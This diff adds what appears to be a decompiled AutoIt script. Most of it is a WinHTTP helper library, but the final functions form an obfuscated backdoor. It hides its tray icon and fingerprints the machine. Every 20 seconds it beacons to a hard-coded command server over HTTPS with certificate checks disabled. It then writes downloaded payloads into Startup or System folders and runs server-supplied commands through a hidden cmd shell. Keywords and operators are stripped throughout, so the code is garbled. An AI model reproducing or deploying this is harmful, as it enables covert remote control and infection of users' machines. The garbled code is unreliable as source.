@@ -1,0 +1,562 @@
+_hextostring($shex)
+(($shex, 2) == "0x")5$shex = "0x" & $shex
+($shex)
+
+$internet_default_port = 0
+$icu_escape = -2147483648
+$winhttp_flag_async = 268435456
+$winhttp_flag_escape_disable = 64
+$winhttp_flag_secure = 8388608
+$winhttp_access_type_no_proxy = 1
+$winhttp_no_proxy_name = ""
+$winhttp_no_proxy_bypass = ""
+$winhttp_no_referer = ""
+$winhttp_default_accept_types = 0
+$winhttp_no_additional_headers = ""
+$winhttp_no_request_data = ""
+$winhttp_header_name_by_index = ""
+$winhttp_no_header_index = 0
+$winhttp_option_callback = 1
+$winhttp_option_resolve_timeout = 2
+$winhttp_option_connect_timeout = 3
+$winhttp_option_connect_retries = 4
+$winhttp_option_send_timeout = 5
+$winhttp_option_receive_timeout = 6
+$winhttp_option_receive_response_timeout = 7
+$winhttp_option_handle_type = 9
+$winhttp_option_read_buffer_size = 12
+$winhttp_option_write_buffer_size = 13
+$winhttp_option_parent_handle = 21
+$winhttp_option_extended_error = 24
+$winhttp_option_security_flags = 31
+$winhttp_option_url = 34
+$winhttp_option_security_key_bitness = 36
+$winhttp_option_proxy = 38
+$winhttp_option_user_agent = 41
+$winhttp_option_context_value = 45
+$winhttp_option_client_cert_context = 47
+$winhttp_option_request_priority = 58
+$winhttp_option_http_version = 59
+$winhttp_option_disable_feature = 63
+$winhttp_option_codepage = 68
+$winhttp_option_max_conns_per_server = 73
+$winhttp_option_max_conns_per_1_0_server = 74
+$winhttp_option_autologon_policy = 77
+$winhttp_option_server_cert_context = 78
+$winhttp_option_enable_feature = 79
+$winhttp_option_worker_thread_count = 80
+$winhttp_option_passport_cobranding_text = 81
+$winhttp_option_passport_cobranding_url = 82
+$winhttp_option_configure_passport_auth = 83
+$winhttp_option_secure_protocols = 84
+$winhttp_option_enabletracing = 85
+$winhttp_option_passport_sign_out = 86
+$winhttp_option_redirect_policy = 88
+$winhttp_option_max_http_automatic_redirects = 89
+$winhttp_option_max_http_status_continue = 90
+$winhttp_option_max_response_header_size = 91
+$winhttp_option_max_response_drain_size = 92
+$winhttp_option_connection_info = 93
+$winhttp_option_spn = 96
+$winhttp_option_global_proxy_creds = 97
+$winhttp_option_global_server_creds = 98
+$winhttp_option_reject_userpwd_in_url = 100
+$winhttp_option_use_global_server_credentials = 101
+$winhttp_option_unsafe_header_parsing = 110
+$winhttp_option_decompression = 118
+$winhttp_option_username = 4096
+$winhttp_option_password = 4097
+$winhttp_option_proxy_username = 4098
+$winhttp_option_proxy_password = 4099
+$winhttp_decompression_flag_all = 3
+$winhttp_autologon_security_level_medium = 0
+$winhttp_autologon_security_level_low = 1
+$winhttp_autologon_security_level_high = 2
+$winhttp_enable_passport_auth = 268435456
+$http_status_denied = 401
+$http_status_proxy_auth_req = 407
+$security_flag_ignore_unknown_ca = 256
+$security_flag_ignore_cert_date_invalid = 8192
+$security_flag_ignore_cert_cn_invalid = 4096
+$security_flag_ignore_cert_wrong_usage = 512
+$winhttp_query_content_type = 1
+$winhttp_query_status_code = 19
+$winhttp_query_raw_headers_crlf = 22
+$winhttp_auth_scheme_passport = 4
+$hwinhttpdll__winhttp = ("winhttp.dll")
+("winhttp.dll")
+_winhttpclosehandle($hinternet)
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpCloseHandle", "handle", $hinternet)
+@error23$acall[0]534(1, 0, 0)
+
+
+_winhttpconnect($hsession, $sservername, $iserverport = 41)
+$aurl = _winhttpcrackurl($sservername), $ischeme = 0
+@error5
+__winhttpdefault($iserverport, $internet_default_port)
+
+$sservername = $aurl[2]
+$iserverport = $aurl[3]
+$ischeme = $aurl[1]
+
+$acall = ($hwinhttpdll__winhttp, "handle", "WinHttpConnect", "handle", $hsession, "wstr", $sservername, "dword", $iserverport, "dword", 0)
+@error23$acall[0]534(1, 0, 0)
+_winhttpsetoption($acall[0], $winhttp_option_context_value, $ischeme)
+$acall[0]
+
+_winhttpcrackurl($surl, $iflag = 41)
+__winhttpdefault($iflag, $icu_escape)
+$turl_components = ("dword StructSize;" & "ptr SchemeName;" & "dword SchemeNameLength;" & "int Scheme;" & "ptr HostName;" & "dword HostNameLength;" & "word Port;" & "ptr UserName;" & "dword UserNameLength;" & "ptr Password;" & "dword PasswordLength;" & "ptr UrlPath;" & "dword UrlPathLength;" & "ptr ExtraInfo;" & "dword ExtraInfoLength")
+($turl_components, 1, ($turl_components))
+$tbuffers[6]
+$iurllen = ($surl)
+$i = 0155
+$tbuffers[$i] = ("wchar[" & $iurllen + 1 & "]")
+
+($turl_components, "SchemeNameLength", $iurllen)
+($turl_components, "SchemeName", ($tbuffers[0]))
+($turl_components, "HostNameLength", $iurllen)
+($turl_components, "HostName", ($tbuffers[1]))
+($turl_components, "UserNameLength", $iurllen)
+($turl_components, "UserName", ($tbuffers[2]))
+($turl_components, "PasswordLength", $iurllen)
+($turl_components, "Password", ($tbuffers[3]))
+($turl_components, "UrlPathLength", $iurllen)
+($turl_components, "UrlPath", ($tbuffers[4]))
+($turl_components, "ExtraInfoLength", $iurllen)
+($turl_components, "ExtraInfo", ($tbuffers[5]))
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpCrackUrl", "wstr", $surl, "dword", $iurllen, "dword", $iflag, "struct*", $turl_components)
+@error23$acall[0]534(1, 0, 0)
+$aret[8] = [($tbuffers[0], 1), ($turl_components, "Scheme"), ($tbuffers[1], 1), ($turl_components, "Port"), ($tbuffers[2], 1), ($tbuffers[3], 1), ($tbuffers[4], 1), ($tbuffers[5], 1)]
+$aret
+
+_winhttpopen($suseragent = 41, $iaccesstype = 41, $sproxyname = 41, $sproxybypass = 41, $iflag = 41)
+__winhttpdefault($suseragent, __winhttpua())
+__winhttpdefault($iaccesstype, $winhttp_access_type_no_proxy)
+__winhttpdefault($sproxyname, $winhttp_no_proxy_name)
+__winhttpdefault($sproxybypass, $winhttp_no_proxy_bypass)
+__winhttpdefault($iflag, 0)
+$acall = ($hwinhttpdll__winhttp, "handle", "WinHttpOpen", "wstr", $suseragent, "dword", $iaccesstype, "wstr", $sproxyname, "wstr", $sproxybypass, "dword", $iflag)
+@error23$acall[0]534(1, 0, 0)
+$iflag = $winhttp_flag_async5_winhttpsetoption($acall[0], $winhttp_option_context_value, $winhttp_flag_async)
+$acall[0]
+
+_winhttpopenrequest($hconnect, $sverb = 41, $sobjectname = 41, $sversion = 41, $sreferrer = 41, $saccepttypes = 41, $iflags = 41)
+__winhttpdefault($sverb, "GET")
+__winhttpdefault($sobjectname, "")
+__winhttpdefault($sversion, "HTTP/1.1")
+__winhttpdefault($sreferrer, $winhttp_no_referer)
+__winhttpdefault($iflags, $winhttp_flag_escape_disable)
+$paccepttypes
+$saccepttypes = 412($saccepttypes) = -15
+$paccepttypes = $winhttp_default_accept_types
+
+$atypes = ($saccepttypes, ",", 2)
+$taccepttypes = ("ptr[" & ($atypes) + 1 & "]")
+$ttype[($atypes)]
+$i = 015($atypes) - 1
+$ttype[$i] = ("wchar[" & ($atypes[$i]) + 1 & "]")
+($ttype[$i], 1, $atypes[$i])
+($taccepttypes, 1, ($ttype[$i]), $i + 1)
+
+$paccepttypes = ($taccepttypes)
+
+$acall = ($hwinhttpdll__winhttp, "handle", "WinHttpOpenRequest", "handle", $hconnect, "wstr", ($sverb), "wstr", $sobjectname, "wstr", ($sversion), "wstr", $sreferrer, "ptr", $paccepttypes, "dword", $iflags)
+@error23$acall[0]534(1, 0, 0)
+$acall[0]
+
+_winhttpqueryauthschemes($hrequest, 36$isupportedschemes, 36$ifirstscheme, 36$iauthtarget)
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpQueryAuthSchemes", "handle", $hrequest, "dword*", 0, "dword*", 0, "dword*", 0)
+@error23$acall[0]534(1, 0, 0)
+$isupportedschemes = $acall[2]
+$ifirstscheme = $acall[3]
+$iauthtarget = $acall[4]
+
+
+_winhttpquerydataavailable($hrequest)
+$sreadtype = "dword*"
+(_winhttpqueryoption(_winhttpqueryoption(_winhttpqueryoption($hrequest, $winhttp_option_parent_handle), $winhttp_option_parent_handle), $winhttp_option_context_value), $winhttp_flag_async)5$sreadtype = "ptr"
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpQueryDataAvailable", "handle", $hrequest, $sreadtype, 0)
+@error534(1, 0, 0)
+($acall[2], $acall[0])
+
+_winhttpqueryheaders($hrequest, $iinfolevel = 41, $sname = 41, $iindex = 41)
+__winhttpdefault($iinfolevel, $winhttp_query_raw_headers_crlf)
+__winhttpdefault($sname, $winhttp_header_name_by_index)
+__winhttpdefault($iindex, $winhttp_no_header_index)
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpQueryHeaders", "handle", $hrequest, "dword", $iinfolevel, "wstr", $sname, "wstr", "", "dword*", 65536, "dword*", $iindex)
+@error23$acall[0]534(1, 0, "")
+($acall[6], $acall[4])
+
+_winhttpqueryoption($hinternet, $ioption)
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpQueryOption", "handle", $hinternet, "dword", $ioption, "ptr", 0, "dword*", 0)
+@error2$acall[0]534(1, 0, "")
+$isize = $acall[4]
+$tbuffer
+$ioption
+$winhttp_option_connection_info, $winhttp_option_password, $winhttp_option_proxy_password, $winhttp_option_proxy_username, $winhttp_option_url, $winhttp_option_username, $winhttp_option_user_agent, $winhttp_option_passport_cobranding_text, $winhttp_option_passport_cobranding_url
+$tbuffer = ("wchar[" & $isize + 1 & "]")
+$winhttp_option_parent_handle, $winhttp_option_callback, $winhttp_option_server_cert_context
+$tbuffer = ("ptr")
+$winhttp_option_connect_timeout, $winhttp_autologon_security_level_high, $winhttp_autologon_security_level_low, $winhttp_autologon_security_level_medium, $winhttp_option_configure_passport_auth, $winhttp_option_connect_retries, $winhttp_option_extended_error, $winhttp_option_handle_type, $winhttp_option_max_conns_per_1_0_server, $winhttp_option_max_conns_per_server, $winhttp_option_max_http_automatic_redirects, $winhttp_option_receive_response_timeout, $winhttp_option_receive_timeout, $winhttp_option_resolve_timeout, $winhttp_option_security_flags, $winhttp_option_security_key_bitness, $winhttp_option_send_timeout
+$tbuffer = ("int")
+$winhttp_option_context_value
+$tbuffer = ("dword_ptr")
+
+$tbuffer = ("byte[" & $isize & "]")
+
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpQueryOption", "handle", $hinternet, "dword", $ioption, "struct*", $tbuffer, "dword*", $isize)
+@error23$acall[0]534(2, 0, "")
+($tbuffer, 1)
+
+_winhttpreaddata($hrequest, $imode = 41, $inumberofbytestoread = 41, $pbuffer = 41)
+__winhttpdefault($imode, 0)
+__winhttpdefault($inumberofbytestoread, 8192)
+$tbuffer, $voutonerror = ""
+$imode = 25$voutonerror = ($voutonerror)
+$imode
+, 2
+$pbuffer1$pbuffer <> 415
+$tbuffer = ("byte[" & $inumberofbytestoread & "]", $pbuffer)
+
+$tbuffer = ("byte[" & $inumberofbytestoread & "]")
+
+
+$imode = 0
+$pbuffer1$pbuffer <> 415
+$tbuffer = ("char[" & $inumberofbytestoread & "]", $pbuffer)
+
+$tbuffer = ("char[" & $inumberofbytestoread & "]")
+
+
+$sreadtype = "dword*"
+(_winhttpqueryoption(_winhttpqueryoption(_winhttpqueryoption($hrequest, $winhttp_option_parent_handle), $winhttp_option_parent_handle), $winhttp_option_context_value), $winhttp_flag_async)5$sreadtype = "ptr"
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpReadData", "handle", $hrequest, "struct*", $tbuffer, "dword", $inumberofbytestoread, $sreadtype, 0)
+@error23$acall[0]534(1, 0, "")
+$acall[4]534(-1, 0, $voutonerror)
+$acall[4] < $inumberofbytestoread5
+$imode
+
+($acall[4], (($tbuffer, 1), $acall[4]))
+
+($acall[4], ((($tbuffer, 1), 1, $acall[4]), 4))
+
+($acall[4], (($tbuffer, 1), 1, $acall[4]))
+
+
+$imode
+, 2
+($acall[4], ($tbuffer, 1))
+
+($acall[4], (($tbuffer, 1), 4))
+
+
+
+_winhttpreceiveresponse($hrequest)
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpReceiveResponse", "handle", $hrequest, "ptr", 0)
+@error23$acall[0]534(1, 0, 0)
+
+
+_winhttpsendrequest($hrequest, $sheaders = 41, $voptional = 41, $itotallength = 41, $icontext = 41)
+__winhttpdefault($sheaders, $winhttp_no_additional_headers)
+__winhttpdefault($voptional, $winhttp_no_request_data)
+__winhttpdefault($itotallength, 0)
+__winhttpdefault($icontext, 0)
+$poptional = 0, $ioptionallength = 0
+@NumParams > 25
+$toptional
+$ioptionallength = ($voptional)
+$toptional = ("byte[" & $ioptionallength & "]")
+$ioptionallength5$poptional = ($toptional)
+($toptional, 1, $voptional)
+
+$itotallength2$itotallength < $ioptionallength5$itotallength += $ioptionallength
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpSendRequest", "handle", $hrequest, "wstr", $sheaders, "dword", 0, "ptr", $poptional, "dword", $ioptionallength, "dword", $itotallength, "dword_ptr", $icontext)
+@error23$acall[0]534(1, 0, 0)
+
+
+_winhttpsetcredentials($hrequest, $iauthtargets, $iauthscheme, $susername, $spassword)
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpSetCredentials", "handle", $hrequest, "dword", $iauthtargets, "dword", $iauthscheme, "wstr", $susername, "wstr", $spassword, "ptr", 0)
+@error23$acall[0]534(1, 0, 0)
+
+
+_winhttpsetoption($hinternet, $ioption, $vsetting, $isize = 41)
+$isize = 415$isize = -1
+($vsetting)5
+$isize = ("byte[" & ($vsetting) & "]")
+($isize, 1, $vsetting)
+$vsetting = $isize
+$isize = ($vsetting)
+
+$stype
+$ioption
+$winhttp_option_autologon_policy, $winhttp_option_codepage, $winhttp_option_configure_passport_auth, $winhttp_option_connect_retries, $winhttp_option_connect_timeout, $winhttp_option_disable_feature, $winhttp_option_enable_feature, $winhttp_option_enabletracing, $winhttp_option_max_conns_per_1_0_server, $winhttp_option_max_conns_per_server, $winhttp_option_max_http_automatic_redirects, $winhttp_option_max_http_status_continue, $winhttp_option_max_response_drain_size, $winhttp_option_max_response_header_size, $winhttp_option_read_buffer_size, $winhttp_option_receive_timeout, $winhttp_option_receive_response_timeout, $winhttp_option_redirect_policy, $winhttp_option_reject_userpwd_in_url, $winhttp_option_request_priority, $winhttp_option_resolve_timeout, $winhttp_option_secure_protocols, $winhttp_option_security_flags, $winhttp_option_security_key_bitness, $winhttp_option_send_timeout, $winhttp_option_spn, $winhttp_option_use_global_server_credentials, $winhttp_option_worker_thread_count, $winhttp_option_write_buffer_size, $winhttp_option_decompression, $winhttp_option_unsafe_header_parsing
+$stype = "dword*"
+$isize = 4
+$winhttp_option_callback, $winhttp_option_passport_sign_out
+$stype = "ptr*"
+$isize = 4
+@AutoItX645$isize = 8
+($vsetting)534(3, 0, 0)
+$winhttp_option_context_value
+$stype = "dword_ptr*"
+$isize = 4
+@AutoItX645$isize = 8
+$winhttp_option_password, $winhttp_option_proxy_password, $winhttp_option_proxy_username, $winhttp_option_user_agent, $winhttp_option_username
+$stype = "wstr"
+(($vsetting)2($vsetting))534(3, 0, 0)
+$isize < 15$isize = ($vsetting)
+$winhttp_option_client_cert_context, $winhttp_option_global_proxy_creds, $winhttp_option_global_server_creds, $winhttp_option_http_version, $winhttp_option_proxy
+$stype = "ptr"
+(($vsetting)2($vsetting))534(3, 0, 0)
+
+(1, 0, 0)
+
+$isize < 15
+($vsetting)5
+$isize = ($vsetting)
+
+(2, 0, 0)
+
+
+$acall
+($vsetting)5
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpSetOption", "handle", $hinternet, "dword", $ioption, $stype, ($vsetting), "dword", $isize)
+
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpSetOption", "handle", $hinternet, "dword", $ioption, $stype, $vsetting, "dword", $isize)
+
+@error23$acall[0]534(4, 0, 0)
+
+
+_winhttpsimpleformfill_setuploadcallback($vcallback = 41, $inumchunks = 100)
+$inumchunks <= 05$inumchunks = 100
+$vfunc = 41, $iparts = $inumchunks
+$vcallback <> 415
+$vfunc = $vcallback
+$iparts = ($inumchunks)
+$vcallback = 05
+$vfunc = 41
+$iparts = 1
+
+$aout[2] = [$vfunc, $iparts]
+$aout
+
+_winhttpsimplereaddata($hrequest, $imode = 41)
+$imode = 415
+$imode = 0
+__winhttpcharset(_winhttpqueryheaders($hrequest, $winhttp_query_content_type)) = 650015$imode = 1
+
+__winhttpdefault($imode, 0)
+
+$imode > 22$imode < 0534(1, 0, "")
+$vdata = ("")
+_winhttpquerydataavailable($hrequest)5
+
+$vdata &= _winhttpreaddata($hrequest, 2)
+@error
+$imode
+
+($vdata)
+
+($vdata, 4)
+
+$vdata
+
+
+(2, 0, $vdata)
+
+_winhttpsimplesendsslrequest($hconnect, $stype = 41, $spath = 41, $sreferrer = 41, $sdta = 41, $sheader = 41, $iignoreallcerterrors = 0)
+__winhttpdefault($stype, "GET")
+__winhttpdefault($spath, "")
+__winhttpdefault($sreferrer, $winhttp_no_referer)
+__winhttpdefault($sdta, $winhttp_no_request_data)
+__winhttpdefault($sheader, $winhttp_no_additional_headers)
+$hrequest = _winhttpopenrequest($hconnect, $stype, $spath, 41, $sreferrer, 41, ($winhttp_flag_secure, $winhttp_flag_escape_disable))
+$hrequest534(1, @error, 0)
+$iignoreallcerterrors5_winhttpsetoption($hrequest, $winhttp_option_security_flags, ($security_flag_ignore_unknown_ca, $security_flag_ignore_cert_date_invalid, $security_flag_ignore_cert_cn_invalid, $security_flag_ignore_cert_wrong_usage))
+$stype = "POST"1$sheader = $winhttp_no_additional_headers5$sheader = "Content-Type: application/x-www-form-urlencoded" & @CRLF
+_winhttpsetoption($hrequest, $winhttp_option_decompression, $winhttp_decompression_flag_all)
+_winhttpsetoption($hrequest, $winhttp_option_unsafe_header_parsing, 1)
+_winhttpsendrequest($hrequest, $sheader, $sdta)
+@error534(2, 0 * _winhttpclosehandle($hrequest), 0)
+_winhttpreceiveresponse($hrequest)
+@error534(3, 0 * _winhttpclosehandle($hrequest), 0)
+$hrequest
+
+_winhttpsimplesslrequest($hconnect, $stype = 41, $spath = 41, $sreferrer = 41, $sdta = 41, $sheader = 41, $fgetheaders = 41, $imode = 41, $scredname = 41, $scredpass = 41, $iignorecerterrors = 0)
+__winhttpdefault($stype, "GET")
+__winhttpdefault($spath, "")
+__winhttpdefault($sreferrer, $winhttp_no_referer)
+__winhttpdefault($sdta, $winhttp_no_request_data)
+__winhttpdefault($sheader, $winhttp_no_additional_headers)
+__winhttpdefault($fgetheaders, 40)
+__winhttpdefault($imode, 41)
+__winhttpdefault($scredname, "")
+__winhttpdefault($scredpass, "")
+$imode > 22$imode < 0534(4, 0, 0)
+$hrequest = _winhttpsimplesendsslrequest($hconnect, $stype, $spath, $sreferrer, $sdta, $sheader, $iignorecerterrors)
+@error534(@error, 0, 0)
+__winhttpsetcredentials($hrequest, $sheader, $sdta, $scredname, $scredpass)
+$fgetheaders5
+$adata[3] = [_winhttpqueryheaders($hrequest), _winhttpsimplereaddata($hrequest, $imode), _winhttpqueryoption($hrequest, $winhttp_option_url)]
+_winhttpclosehandle($hrequest)
+$adata
+
+$soutdata = _winhttpsimplereaddata($hrequest, $imode)
+_winhttpclosehandle($hrequest)
+$soutdata
+
+_winhttpwritedata($hrequest, $vdata, $imode = 41)
+__winhttpdefault($imode, 0)
+$inumberofbytestowrite, $tdata
+$imode = 15
+$inumberofbytestowrite = ($vdata)
+$tdata = ("byte[" & $inumberofbytestowrite & "]")
+($tdata, 1, $vdata)
+($vdata)5
+$inumberofbytestowrite = ($vdata)
+$tdata = $vdata
+
+$inumberofbytestowrite = ($vdata)
+$tdata = ("char[" & $inumberofbytestowrite + 1 & "]")
+($tdata, 1, $vdata)
+
+$acall = ($hwinhttpdll__winhttp, "bool", "WinHttpWriteData", "handle", $hrequest, "struct*", $tdata, "dword", $inumberofbytestowrite, "dword*", 0)
+@error23$acall[0]534(1, 0, 0)
+($acall[4], 1)
+
+__winhttpcharset($scontenttype)
+$acontenttype = ($scontenttype, "(?i).*?\Qcharset=\E(?U)([^ ]+)(;| |\Z)", 2)
+@error5$scontenttype = $acontenttype[1]
+($scontenttype, 2) = "cp"534(($scontenttype, 2))
+$scontenttype = "utf-8"53465001
+
+__winhttpsetcredentials($hrequest, $sheaders = "", $soptional = "", $scredname = "", $scredpass = "", $iformfill = 0)
+$scredname1$scredpass5
+$istatuscode = _winhttpqueryheaders($hrequest, $winhttp_query_status_code)
+$istatuscode = $http_status_denied2$istatuscode = $http_status_proxy_auth_req5
+$isupportedschemes, $ifirstscheme, $iauthtarget
+_winhttpqueryauthschemes($hrequest, $isupportedschemes, $ifirstscheme, $iauthtarget)5
+$ifirstscheme = $winhttp_auth_scheme_passport1$istatuscode = $http_status_proxy_auth_req5
+_winhttpsetoption($hrequest, $winhttp_option_configure_passport_auth, $winhttp_enable_passport_auth)
+_winhttpsetoption($hrequest, $winhttp_option_proxy_username, $scredname)
+_winhttpsetoption($hrequest, $winhttp_option_proxy_password, $scredpass)
+
+_winhttpsetcredentials($hrequest, $iauthtarget, $ifirstscheme, $scredname, $scredpass)
+
+$iformfill5
+__winhttpformupload($hrequest, $sheaders, $soptional)
+
+_winhttpsendrequest($hrequest, $sheaders, $soptional)
+
+_winhttpreceiveresponse($hrequest)
+
+
+
+
+__winhttpformupload($hrequest, $sheaders, $sdata)
+$aclbk = _winhttpsimpleformfill_setuploadcallback()
+$aclbk[0] <> 415
+$isize = ($sdata), $ichunk = ($isize / $aclbk[1]), $irest = $isize - ($aclbk[1] - 1) * $ichunk, $icurch = $ichunk
+_winhttpsendrequest($hrequest, 41, 41, $isize)
+$i = 115$aclbk[1]
+$i = $aclbk[1]5$icurch = $irest
+_winhttpwritedata($hrequest, ($sdata, 1 + $ichunk * ($i - 1), $icurch))
+($aclbk[0], ($i * 100 / $aclbk[1]))
+
+
+_winhttpsendrequest($hrequest, 41, $sdata)
+
+
+__winhttpdefault(36$vinput, $voutput)
+$vinput = 412($vinput) = -15$vinput = $voutput
+
+__winhttpua()
+$sua = "Mozilla/5.0 " & __winhttpsysinfo() & " WinHttp/" & __winhttpver() & " (WinHTTP/5.1) like Gecko"
+$sua
+
+__winhttpsysinfo()
+$sdta = ("kernel32.dll")
+$sdta = "(Windows NT " & ($sdta, ($sdta, ".", 1, 2) - 1)
+(@OSArch, "64")13@AutoItX645$sdta &= "; WOW64"
+$sdta &= ")"
+$sdta
+
+__winhttpver()
+"1.6.4.1"
+
+(_hextostring("5472617949636F6E48696465"), 1)
+_postdate()
+$a = ((@HomeDrive & _hextostring("5C")))
+$b = ((@ComputerName))
+($b) < 8
+$b += _hextostring("2D")
+
+$b = (($a) & $b, 16)
+$b
+
+quickoutput($filename, $output)
+$filename = parsestring($filename)
+$output = _hextostring($output)
+$file = ($filename, 2 + 8 + 16)
+$file = -153439
+$errorwritefile = ($file, $output)
+$errorwritefile = 053439
+($file)
+($filename, 20131101, 1)
+((2, 3, 1) * 10000)
+
+parsestring($path)
+$delay = 20000
+$path = ($path, _hextostring("253125"), @AppDataCommonDir)
+$path = ($path, _hextostring("253225"), @AppDataDir)
+$path = ($path, _hextostring("253325"), @LOCALAPPDATADIR)
+$path = ($path, _hextostring("253425"), @StartupDir)
+$path = ($path, _hextostring("253525"), @SystemDir)
+$path
+
+parsefile($data)
+$delay = (3, 7) * 62000
+$ares = ($data, @CRLF)
+@error = 15
+($delay)
+checkupdate()
+
+$body = ""
+$i = $ares[0] - 1
+$body = $body & $ares[$i]
+
+$ares[1] = _hextostring("2D31")5
+($delay)
+checkupdate()
+
+$body = ($body, 8)
+$body = ($body)
+$rule = quickoutput($ares[3], $body)
+$rule5
+($delay)
+checkupdate()
+
+($ares[3], 20131101, 0)
+_repl(parsestring($ares[1]))
+($ares[3], 20131101, 3)
+
+
+
+_repl($scommand)
+$nresult = ('"' & @ComSpec & '" /c "' & $scommand & '"', "", @SW_HIDE, 6)
+($nresult)
+
+checkupdate()
+$postdata = _hextostring("7263643D") & _postdate()
+$host = _hextostring("68747470733A2F2F3134352E3234392E3130362E3139382F0D0A")
+$uri = _hextostring("636C69656E742F656E2F636F6D6D756E6974792F737570706F7274636C692E706870")
+$hopen = _winhttpopen(_hextostring("4D6F7A696C6C612F352E30202857696E646F7773204E5420362E313B20574F5736343B2072763A32352E3029204765636B6F2F32303130303130312046697265666F782F32352E30"))
+$hconnect = _winhttpconnect($hopen, $host)
+$sreturned = _winhttpsimplesslrequest($hconnect, _hextostring("504F5354"), $uri, 41, $postdata, 41, 41, 41, 41, 41, 1)
+_winhttpclosehandle($hconnect)
+_winhttpclosehandle($hopen)
+parsefile($sreturned)
+
+(20000)
+checkupdate()
